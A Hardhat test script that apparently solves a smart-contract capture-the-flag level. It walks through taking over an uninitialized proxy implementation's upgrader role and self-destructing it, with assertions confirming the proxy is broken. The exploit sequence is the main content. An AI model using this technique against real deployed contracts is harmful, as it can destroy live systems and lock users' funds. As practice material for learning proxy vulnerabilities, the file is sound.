import { expect } from "chai";
import { ethers } from "hardhat";

let owner, attacker;

describe("Attack", function () {
  it("Should complete the attack", async function () {
    // SETUP SCENARIO
    [owner, attacker] = await ethers.getSigners();

    // Implementation contract
    const Engine = await ethers.getContractFactory("Engine");
    const engine = await Engine.deploy();
    await engine.deployed();

    // Proxy contract
    const Motorbike = await ethers.getContractFactory("Motorbike");
    let motorbike = await Motorbike.deploy(engine.address);
    await motorbike.deployed();

    // This is our proxy instance but with the interface of the implementation. 
    // This is useful to call the implementation through the proxy
    let proxyedMotorbike = await Engine.attach(motorbike.address);
    expect(await motorbike.address).to.exist;

    // PREPARE AN ATTACK CONTRACT
    const Attack = await ethers.getContractFactory("Attack");
    const attack = await Attack.deploy(engine.address);
    await attack.deployed();

    // PROVE THAT IMPLEMENTATION IS A CONTRACT (It has code)
    let tx = await attack.validateItIsBroken();
    let isItBroken = await tx.wait();
    let eventsEmitted = isItBroken.events ? isItBroken.events : [];
    expect(eventsEmitted[0].args?.result).to.true;

    // Expect the implementation to not have any `upgrader` set (Nobody initialized it)
    expect(parseFloat(await engine.upgrader())).to.equal(0);

    // On the contrary, expect the proxy (which is the storage layer) to have it set (in the constructor);
    expect((await proxyedMotorbike.upgrader())).to.equal(owner.address)

    // ATTACK FIRST STEP: Take control over upgradeability functionality
    tx = await attack.connect(attacker).takeControl();
    let receipt = await tx.wait();

    // Expect the attacker to have conquered the "upgrader" role in the implementation
    expect(await engine.upgrader()).to.equal(attack.address);

    // ATTACK SECOND STEP: Destroy the implementation
    tx = await attack.connect(attacker).destroy();
    receipt = await tx.wait();
    let result = receipt.status ? true : false;
    expect(result).to.true;
    // --------

    // Expect the implementation address to return false on "Address.isContract()"
    tx = await attack.validateItIsBroken();
    isItBroken = await tx.wait()
    eventsEmitted = isItBroken.events ? isItBroken.events : [];
    expect(eventsEmitted[0].args?.result).to.false;

    // Expect the implementation to not be able to return the `upgrader` parameter value ('cause it's broken now)
    try {
        await engine.upgrader();
    } catch(error) {
        expect(JSON.stringify(error)).to.include("CALL_EXCEPTION");
    }

    // Expect to not be able to call "upgrader()" anymore through the proxy (it is broken)
    try {
        await proxyedMotorbike.upgrader();
    } catch(error) {
        expect(JSON.stringify(error)).to.include("CALL_EXCEPTION");
    }
  });
});
